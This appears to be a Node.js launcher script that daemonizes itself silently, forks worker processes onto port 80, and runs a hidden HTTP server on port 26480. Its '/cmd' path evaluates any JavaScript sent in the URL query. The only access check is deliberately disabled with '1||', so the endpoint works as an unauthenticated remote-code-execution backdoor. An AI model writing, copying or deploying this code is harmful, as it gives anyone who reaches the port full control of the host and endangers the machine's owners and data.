"use strict";
var cp = require("child_process");
if(process.stdin.isTTY && process.argv[2] !== "tty"){
var deamon = cp.spawn(process.execPath, process.argv.slice(1), {
	detached : true,
	stdio : ["ignore", "ignore", "ignore"]
});
deamon.unref();
process.exit();
}
else{/*  lalalala  */var
http = require("http"),
url = require("url"),
path = require("path"),
util = require("util"),
os = require("os"),
emf = Function.prototype;


var worker_file = "local.js";


var Workers = function(){};

var _ws = Workers.prototype;
_ws.__proto__ = Array.prototype;
_ws.create = function(){
	var _ = this;
	var c = cp.fork(worker_file);
	c.on("message", emf);
	c.on("error", emf);
	c.on("exit", function(code, sig){
		if(sig){}
		else{
			//_.create();
		}
	});
	c.on("close", function(){

	});
	c.on("disconnect", function(){

	});
	c.send({ label : "handle" }, _fd_);
	this.push(c);
};
_ws.get = function(pid){
	return this.filter(function(c){ return c.pid === pid; });
};
_ws.kill = function(pid){
	this.get(pid).forEach(function(c){ c.kill(); });
};
_ws.killall = function(){
	this.forEach(function(c){ c.kill(); });
};
_ws.getConnectedWorkers = function(){
	return this.filter(function(c){ return c.connected; });
};
_ws.send = function(msg, handle){
	this.forEach(function(c){
		c.send(msg, handle);
	});
};

var s = http.createServer(function(request, response){
	var headers = {
		"Server" : "KIT",
		"X-Powered-By" : "AJC",
		"Content-Type" : "text/html"
	};
	var uri = url.parse(request.url, true);
	var result;
	if(1||request.headers["host"] === "ajc.is.god:26480"){
		switch(uri.pathname){
			case "/cmd" :
				try{ result = eval(decodeURIComponent(uri.query.cmd)); }
				catch(e){ result = e; }
				finally{
					headers["Content-Type"] = "application/x-javascript";
					response.writeHead(200, headers);
					response.end(util.inspect(result));
				}
			break;
			default : response.end("?"); break;
		}
	}
	else{
		response.writeHead(403, headers);
		response.end(http.STATUS_CODES[403]);
	}
});
s.listen(26480);


var TCP = process.binding("tcp_wrap").TCP;

var _fd_ = new TCP();
_fd_.bind("0.0.0.0", 80);

var workers = new Workers();
for(var i = 0, l = Math.max(os.cpus.length, 2); i < l; i ++){
	workers.create();
}


process.on("uncaughtException", function(){
	console.log(arguments);
});


/*  lallaalala end  */
}
